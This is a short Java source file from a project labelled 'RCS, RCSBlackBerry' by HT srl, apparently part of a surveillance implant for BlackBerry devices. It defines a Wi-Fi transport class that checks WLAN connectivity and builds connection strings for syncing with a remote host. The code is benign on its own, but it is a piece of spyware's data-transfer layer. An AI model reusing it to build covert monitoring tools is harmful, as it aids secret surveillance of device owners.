//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class WifiTransport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug("WifiTransport", DebugLevel.VERBOSE);
    //#endif

    boolean wifiForced;

    public WifiTransport(String host, boolean wifiForced) {
        super(host);

        this.wifiForced = wifiForced;
    }

    public boolean isAvailable() {
        final boolean wifi = WLANInfo.getAPInfo() != null;
        final boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        boolean available = (WLANInfo.getWLANState() & WLANInfo.WLAN_STATE_CONNECTED) != 0;

        //#ifdef DEBUG
        debug.trace("isAvailable wifi: " + wifi + " & " + active + " & "
                + available);
        //#endif
        return wifi && active && available;
    }

    protected String getSuffix() {
        return ";deviceside=true;interface=wifi";
    }

    public String toString() {
        return "WifiTransport " + host;
    }
}
